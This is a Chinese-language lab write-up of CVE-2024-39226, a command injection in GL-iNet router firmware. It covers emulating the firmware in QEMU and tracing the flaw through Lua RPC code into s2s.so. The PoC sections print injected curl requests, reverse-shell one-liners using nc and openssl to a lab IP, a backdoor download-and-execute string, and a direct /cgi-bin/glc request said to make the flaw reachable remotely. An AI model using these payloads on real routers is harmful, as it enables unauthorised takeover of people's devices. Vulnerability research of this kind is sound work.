#  CVE-2024-39226 命令注入

## 1.漏洞描述

GL-iNet 产品 AR750/AR750S/AR300M/AR300M16/MT300N-V2/B1300/MT1300/SFT1200/X750 v4.3.11、MT3000/MT2500/AXT1800/AX1800/A1300/X300B v4.5.16、XE300 v4.3.16、E750 v4.3.12、AP1300/S1300 v4.3.13 和 XE3000/X3000 v4.4 被发现存在漏洞，攻击者可以利用该漏洞通过 s2s API 传递恶意 shell 命令来操纵路由器

GL-iNet 是一家专注于智能路由器和网络设备开发的科技公司。成立于 2009 年，总部位于中国，该公司的产品以 OpenWrt 操作系统为基础，提供高度的可定制性和灵活性。GL-iNet 路由器的管理系统是基于 luci-nginx-OpenResty 开发的，核心功能都是 lua 写的



## 2.环境搭建

固件下载：https://dl.gl-inet.cn/，下载版本：GL-AX1800 Flint 4.5.16



根据 busybox，可知是 32 位小端 arm 架构

![image-20250220235701753](./assets/CVE-2024-39226命令注入/image-20250220235701753.png)

ARM 架构处理器因为 **低功耗、封装** 限制等种种原因，内部资源宝贵，所以浮点运算单元是十分奢侈的。ARM 体系架构内核中，有些有浮点运算单元（fpu），有些没有。对于没有 fpu 内核，是不能使用 armel 和 armhf 的，有 fpu 的情况下，就可以通过 gcc 的选项-mfloat-abi 来指定使用哪种：

- **soft：** 不用 fpu 计算，即使有 fpu 浮点运算单元也不用。
- **armel：** 也即 softfp，用 fpu 计算，但是传参数用普通寄存器传，这样中断的时候，只需要保存普通寄存器，中断负荷小，但是参数需要转换成浮点的再计算。
- **armhf：** 也即 hard，用 fpu 计算，传参数用 fpu 中的浮点寄存器传，省去了转换性能最好，但是中断负荷高。
- arm64：64 位的 arm 默认就是 hard float 的，因此不需要 hf 的后缀

而后面的 EABI，指的是嵌入式 ABI。嵌入式应用二进制接口指定了文件格式、数据类型、寄存器使用、堆积组织优化和在一个嵌入式软件中的参数的标准约定。好比 ABI 是计算机上的，EABI 是嵌入式平台上（如 ARM，MIPS 等）

另外还有一个大小端的区别在使用 qemu 时可以发现：

```
ARMEB = ARM EABI Big-endian ,也有称为ARMBE      #大端字节序
ARMEL = ARM EABI Little-endian,也有称为ARMLE    #小端字节序
```



下载 arm 架构的内核镜像和文件系统：https://people.debian.org/~aurel32/qemu/armhf/

```shell
wget https://people.debian.org/\~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress #linux 内核镜像文件
wget https://people.debian.org/\~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress #RAM 磁盘映像文件
wget https://people.debian.org/\~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2  #虚拟磁盘映像文件
```

```shell
chmod +777 -R ./ 
```

环境模拟 start.sh:

```shell
#!/bin/bash

sudo qemu-system-arm \
    -cpu cortex-a15 \
    -M vexpress-a9 \
    -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2" \
    -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic
```

网络配置 net.sh:

```shell
#!/bin/sh
sudo brctl addbr br0                   # 添加一个名为 br0 的网桥
sudo ifconfig br0 192.168.2.3/24 up    # 启用 br0 接口
sudo tunctl -t tap0 -u root            # 创建一个只许 root 访问的 tap0 接口
sudo ifconfig tap0 192.168.2.1/24 up   # 启用 tap0 接口
sudo brctl addif br0 tap0              # 在虚拟网桥中增加一个 tap0 接口
```

取消网络配置 unset_net.sh:

```shell
#!/bin/sh
sudo ifconfig br0 down # 关闭设备
sudo ifconfig tap0 down # 关闭设备
sudo brctl delbr br0 # 删除网桥
sudo tunctl -d tap0 # 删除网卡
```

qemu 网络配置：

```shell
ifconfig eth0 192.168.2.2/24 up
ping 192.168.2.1 #测下网
```

打包上传：

```shell
tar czvf rootfs.tar.gz ./squashfs-root
sudo scp -r rootfs.tar.gz root@192.168.2.2:/root/
tar -xzvf rootfs.tar.gz
```

启动：

```shell
chmod -R 777 squashfs-root/
cd squashfs-root/
# 挂载文件系统
mount --bind /proc proc
mount --bind /dev dev
chroot . /bin/sh
```



要搭建 web 页面的访问，全局搜索一下 index.html, 发现是出现在 nginx.conf 下，所以其 web 服务器猜测应该是 nginx

nginx 启动脚本：/etc/init.d/nginx:

会检查否存在 uhttpd 的初始化脚本（因为 uHTTPd 是 LuCI 默认的 Web 服务器），如果存在，则会停止并禁用其服务，并创建 nginx 服务目录并启动服务

```shell
#!/bin/sh /etc/rc.common
# Copyright (C) 2015 OpenWrt.org

START=80

USE_PROCD=1

start_service() {
	[ -f /etc/init.d/uhttpd ] && {
		/etc/init.d/uhttpd enabled && {
			/etc/init.d/uhttpd stop
			/etc/init.d/uhttpd disable
		}
	}

	[ -d /var/log/nginx ] || mkdir -p /var/log/nginx
	[ -d /var/lib/nginx ] || mkdir -p /var/lib/nginx

	procd_open_instance
	procd_set_param command /usr/sbin/nginx -c /etc/nginx/nginx.conf -g 'daemon off;'
	procd_set_param file /etc/nginx/nginx.conf
	procd_set_param respawn
	procd_close_instance
}
```

相关报错修复：（虽然还是有报错，但是服务还是启起来了，并且有 web 界面，其实只要服务能够启起来没有 web 界面也是可以的）

```shell
mkdir /var/log
mkdir /var/lib
mkdir /var/run
mkdir /var/log/nginx
mkdir /var/lib/nginx
/etc/init.d/boot boot
/etc/uci-defaults/80_nginx-oui
/usr/sbin/nginx -c /etc/nginx/nginx.conf -g 'daemon off;'
```

![image-20250221162133914](./assets/CVE-2024-39226命令注入/image-20250221162133914.png)







## 3.漏洞分析

首先验证一下 poc，但是会返回 error

curl 常用来请求 Web 服务器，它的名字就是客户端（client）的 URL 工具的意思，curl 的常见用法：

* get：`curl url` ， -v 参数可以让我们看到详细的请求信息
* post：`curl -H header -d body -X 请求协议 url`
  * 请求协议可能是 POST、GET、DELETE、PUSH、PUT、OPTIONS、HEAD
  * 由于 `-d` 是 `--data` 的简写，用于向服务器发送数据，通常与 POST 请求一起使用，所以 poc 中没有写 `-X`

```shell
curl -H 'glinet: 1' 127.0.0.1/rpc -d '{"method":"call", "params":["", "s2s", "enable_echo_server", {"port": "7 $(touch /root/test)"}]}'
```

![image-20250221162749702](./assets/CVE-2024-39226命令注入/image-20250221162749702.png)

根据访问页面查看一下 rpc 相关信息，可以看到路径 /etc/nginx/conf.d/gl.conf 下有对其路径的处理方法

![image-20250221162919662](./assets/CVE-2024-39226命令注入/image-20250221162919662.png)

poc 中的 call 方法对应 oui-rpc.lua 的 rpc_method_call 函数，oui-rpc.lua 中最前面还会验证我们发送的是否 post 请求

rpc_method_call 函数中也有许多判断：

* params 的长度小于 3，则返回一个错误响应，表示参数无效
* 检查 sid、object 和 method 是否为字符串类型，以及 args 是否为表类型
* 如果 object 和 method 需要认证，则检查访问权限。如果没有权限，则返回一个错误响应
* 调用 rpc.call 方法执行实际的 RPC 调用。如果返回结果是数字类型，则表示发生错误，返回错误响应。如果返回结果不是表类型，则将其设置为空表
* 最后，将结果封装成响应并返回

```lua
local rpc = require "oui.rpc"

local function rpc_method_call(id, params)
    if #params < 3 then
        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)
        ngx.say(cjson.encode(resp))
        return
    end

    local sid, object, method, args = params[1], params[2], params[3], params[4]

    if type(sid) ~= "string" or type(object) ~= "string" or type(method) ~= "string" then
        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)
        ngx.say(cjson.encode(resp))
        return
    end

    if args and type(args) ~= "table" then
        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)
        ngx.say(cjson.encode(resp))
        return
    end

    ngx.ctx.sid = sid

    if not rpc.is_no_auth(object, method) then
        if not rpc.access("rpc", object .. "." .. method) then
            local resp = rpc.error_response(id, rpc.ERROR_CODE_ACCESS)
            ngx.say(cjson.encode(resp))
            return
        end
    end

    local res = rpc.call(object, method, args)
    if type(res) == "number" then
        local resp = rpc.error_response(id, res)
        ngx.say(cjson.encode(resp))
        return
    end

    if type(res) ~= "table" then res = {} end

    local resp = rpc.result_response(id, res)
    ngx.say(cjson.encode(resp))
end
```

追踪 usr/lib/lua/oui/rpc.lua 中的 access 函数和 call 函数

在 access 函数中会调用 session 函数，其目的是获取当前会话信息，并且会检查会话是否为本地会话，并且请求头中是否包含 glinet 字段。如果条件满足，直接返回 true，表示允许访问，否则，要是 root 管理员组才能返回 true。所以，这个漏洞目前只能在本地利用。并且在 session 函数中会使用 ubus 进行通信

```lua
M.access = function(scope, entry, need)
    local headers = ngx.req.get_headers()
    local s = M.session()
    local aclgroup = s.aclgroup

    if s.is_local and headers["glinet"] then
        return true
    end

    -- The admin acl group is always allowed
    if aclgroup == "root" then return true end

    if not aclgroup or aclgroup == "" then return false end

    local perm = db.get_perm(aclgroup, scope, entry)

    if not need then return false end

    if need == "r" then
        return perm:find("[r,w]") ~= nil
    else
        return perm:find(need) ~= nil
    end
end
```

在 call 函数中会调用 glc_call 函数

```lua
M.call = function(object, method, args)
    ngx.log(ngx.DEBUG, "call: '", object, ".", method, "'")

    if not objects[object] then
        local script = "/usr/lib/oui-httpd/rpc/" .. object
        if not fs.access(script) then
            return glc_call(object, method, args)
        end

        local ok, tb = pcall(dofile, script)
        if not ok then
            ngx.log(ngx.ERR, tb)
            return glc_call(object, method, args)
        end

        if type(tb) == "table" then
            local funs = {}
            for k, v in pairs(tb) do
                if type(v) == "function" then
                    funs[k] = v
                end
            end
            objects[object] = funs
        end
    end

    local fn = objects[object] and objects[object][method]
    if not fn  then
        return glc_call(object, method, args)
    end

    return fn(args)
end
```

在 glc_call 函数中，我们可以看到 ERROR_CODE_INTERNAL_ERROR，并且对应的错误号为-32603，正好于我们上面 poc 验证时出现的报错一致，那么很明显问题出现在 /cgi-bin/glc

```lua
local function glc_call(object, method, args)
    ngx.log(ngx.DEBUG, "call C: '", object, ".", method, "'")

    local res = ngx.location.capture("/cgi-bin/glc", {
        method = ngx.HTTP_POST,
        body = cjson.encode({
            object = object,
            method = method,
            args = args or {}
        })
    })

    if res.status ~= ngx.HTTP_OK then return M.ERROR_CODE_INTERNAL_ERROR end

    local body = res.body
    local code = tonumber(body:match("(-?%d+)"))

    if code ~= M.ERROR_CODE_NONE then
        local err_msg = body:match("%d+ (.+)")
        if err_msg then
            ngx.log(ngx.ERR, err_msg)
        end
        return code
    end

    local msg = body:match("%d+ (.*)")

    return cjson.decode(msg)
end
```

在 /cgi-bin/glc 二进制文件中，处理逻辑是：

* 进入 cgi-debug 模式，检查请求方法并存储请求数据，并解析 json 格式的数据
* 使用 dlopen 加载一个共享库文件，而这个加载的动态库对应漏洞描述和 poc 里的 s2s
* 使用 dlsym 获取函数指针，并处理执行

![image-20250221194858443](./assets/CVE-2024-39226命令注入/image-20250221194858443.png)

在 s2s.so 中，根据 poc，定位到 enable_echo_server 函数，其中主要启动了一个回显服务器并配置防火墙规则

* 初始化并获取端口号
* 检查端口号的范围
* 检查 `/usr/bin/echo_server` 文件是否存在
  * 先杀死现有的 `echo_server` 进程
  * 然后启动新的 `echo_server` 进程
* 初始化 guci，并添加防火墙规则
* 调用 iptables 命令处理对应规则

那么这里的漏洞就很明显了，没有对 port 进行严格的过滤（仅存在一个大小比较）

![image-20250221201202182](./assets/CVE-2024-39226命令注入/image-20250221201202182.png)



## 4.poc 验证

由于前面的 poc 验证出现了问题，所以使用 vi 编辑器编辑 etc/nginx/nginx.conf 文件，添加一行 `error_log  /tmp/error.log  debug;`, 并重启 nginx 服务

发送 poc 后，我们可以看到报错信息，主要是连接到两个 `/var/run/ngx-ubus-proxy.sock` 和 `/var/run/fcgiwrap.socket` 失败

补充一下：/var/run 目录中存放的是自系统启动以来描述系统信息的文件，/var/run 使用的是 tmpfs 文件系统，这是一种存储在内存中的临时文件系统，当机器关闭的时候，文件系统自然就被清空了。在目前的 linux 系统中，/var/run 目录，应该指向 run 目录

![image-20250221204029940](./assets/CVE-2024-39226命令注入/image-20250221204029940.png)

fcgiwrap: Simple FastCGI wrapper for CGI scripts。NGINX 就是一个只支持 FastCGI，不支持 CGI 的 HTTP（Web）服务器之一。由于 CGI 诞生已经非常久远了，并且它每次在处理一个请求（连接）时都要重新启动脚本（可执行文件），重新传递所有的环境变量（其中非常多是完全一样的），导致性能非常低下。后来出现了性能更高的 FastCGI，FastCGI 性能更高的原因在于，它是常驻内存的，一个 FastCGI 进程可以处理任意多个连接。后来又出现了 Spawn-FCGI，其使得 FastCGI 的进程数可以根据服务器的压力状况动态地创建 FastCGI 进程，这样，可伸缩性就更强了

```shell
~ # fcgiwrap -h
Usage: fcgiwrap [OPTION]
Invokes CGI scripts as FCGI.

fcgiwrap version 

Options are:
  -f			Send CGI's stderr over FastCGI
  -c <number>		Number of processes to prefork
  -s <socket_url>	Socket to bind to (say -s help for help)
  -h			Show this help message and exit
  -p <path>		Restrict execution to this script. (repeated options will be merged)

Report bugs to Grzegorz Nosek <>.
fcgiwrap home page: <http://nginx.localdomain.pl/wiki/FcgiWrap>
```

```shell
mkdir /var/log
mkdir /var/lib
mkdir /var/run
mkdir /var/log/nginx
mkdir /var/lib/nginx
/etc/init.d/boot boot
/etc/uci-defaults/80_nginx-oui &
/sbin/ubusd &
/usr/bin/fcgiwrap -c 4 -s unix:/var/run/fcgiwrap.socket &
/usr/sbin/nginx -c /etc/nginx/nginx.conf -g 'daemon off;'
```

![image-20250221212823635](./assets/CVE-2024-39226命令注入/image-20250221212823635.png)



反弹 shell： mkfifo：创建 FIFO 特殊文件（命名管道）

利用 nc：

靶机：

```shell
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.1 6000 > /tmp/f ; rm /tmp/f
```

![image-20250221234001552](./assets/CVE-2024-39226命令注入/image-20250221234001552.png)

```shell
mkfifo /tmp/f; /bin/sh -i 2>&1 < /tmp/f | nc 192.168.2.1 6000 > /tmp/f ; rm /tmp/f
```

![image-20250221234235296](./assets/CVE-2024-39226命令注入/image-20250221234235296.png)

```shell
mkfifo /tmp/f ; nc 192.168.2.1 6000 < /tmp/f | bash -i  > /tmp/f 2>&1 ; rm /tmp/f
```

![image-20250221234403674](./assets/CVE-2024-39226命令注入/image-20250221234403674.png)

攻击机：

```shell
nc -lvp 6000
```



利用 openssl：

```shell
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 6000
or ：
ncat --ssl -vv -l -p 6000
```

```shell
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.2.1:6000 > /tmp/s; rm /tmp/s
```



此外，还可以利用木马文件：

* metasploit 的 msfvenom 生成一个目标系统架构的 backdoor 文件，功能是反连 shell

* 然后本地 python 起一个 http 服务

  * 服务端：

    ```shell
    python -m SimpleHTTPServer，默认监听本地8000端口
    ```

  * 客户端：

    ```shell
    wget http://ip:8000/xxx
    ```

* 本地监听：

  ```shell
  nc -l [port]
  ```

* 命令注入：

  ```shell
  ;wget backdoor;chmod +x backdoor;./backdoor;
  ```

  

## 5.后续

官方 poc 只能够在本地实现，blonet 师傅提到其实是可以远程利用的

再补充一点：*RPC*（Remote Procedure Call）是远程过程调用协议

在 /usr/share/gl-ngx/oui-rpc.lua 中，我们要跳过下面这部分代码：

* 首先考虑 rpc.is_no_auth(object, method)是否能返回 1，这样的话我们就不用管 access 了
* 其次是 access 的绕过

```lua
if not rpc.is_no_auth(object, method) then
    if not rpc.access("rpc", object .. "." .. method) then
        local resp = rpc.error_response(id, rpc.ERROR_CODE_ACCESS)
        ngx.say(cjson.encode(resp))
        return
    end
end
```

is_no_auth()函数建一个 UCI 游标 c，用于访问 UCI 配置文件，并检查对象和方法是否不需要身份验证

UCI（Unified Configuration Interface，统一配置接口）是 OpenWrt 系统中的一个配置管理系统，用于统一管理各种配置文件。它提供了一种结构化的方式来读取、修改和保存配置文件，使得配置管理更加方便和一致

oui-httpd 中并没有我们要利用的对象和方法，所以不会返回 true，这条路失败了

```lua
M.is_no_auth = function(object, method)
    local c = uci.cursor()

    if not no_auth_methods then
        no_auth_methods = {}

        c:foreach("oui-httpd", "no-auth-methods", function(s)
            local ms = {}

            for _, m in ipairs(s.method) do
                ms[m] = true
            end

            no_auth_methods[s.object] = ms
        end)
    end

    if no_auth_methods[object] and no_auth_methods[object][method] then
        return true
    end

    return false
end
```

那么下面我们就要确保 rpc.access()调用完后返回的是 true，上面调用函数时传递两个参数：`"rpc"` 和 `object .. "." .. method`。第一个参数 "rpc" 表示访问的范围，第二个参数是通过连接对象名称和方法名称生成的字符串

但是这里其实不是本地的话也是无法绕过的

```lua
M.access = function(scope, entry, need)
    local headers = ngx.req.get_headers()
    local s = M.session()
    local aclgroup = s.aclgroup

    if s.is_local and headers["glinet"] then
        return true
    end

    -- The admin acl group is always allowed
    if aclgroup == "root" then return true end

    if not aclgroup or aclgroup == "" then return false end

    local perm = db.get_perm(aclgroup, scope, entry)

    if not need then return false end

    if need == "r" then
        return perm:find("[r,w]") ~= nil
    else
        return perm:find(need) ~= nil
    end
end
```

那最终我们还是只能假设我们是本地，然后调用的是 call 函数，最后调用 glc_call，那么我们的想法是，不要前面的 accsss 的检查，而是直接调用 glc_call 函数

给他直接传递 object, method, args 参数就好了，也就对应着原本 poc 的 params 参数中的 2，3，4 参数

补充：CGI-BIN（通用网关接口）是一种特殊的目录，在进行交互式的 WWW 访问

![image-20250224092715068](./assets/CVE-2024-39226命令注入/image-20250224092715068.png)

```shell
curl -H 'glinet: 1' 127.0.0.1/rpc -d '{"method":"call", "params":["", "s2s", "enable_echo_server", {"port": "7 $(touch /root/test)"}]}'
```

```lua
local function glc_call(object, method, args)
    ngx.log(ngx.DEBUG, "call C: '", object, ".", method, "'")

    local res = ngx.location.capture("/cgi-bin/glc", {
        method = ngx.HTTP_POST,
        body = cjson.encode({
            object = object,
            method = method,
            args = args or {}
        })
    })
```

那么对照着规则构造一下 poc：

```shell
curl 192.168.2.2/cgi-bin/glc -d '{"object":"s2s", "method":"enable_echo_server", "args":{"port":"7 $(touch /root/test)"}}'
```

远程验证成功：

![image-20250224100103412](./assets/CVE-2024-39226命令注入/image-20250224100103412.png)
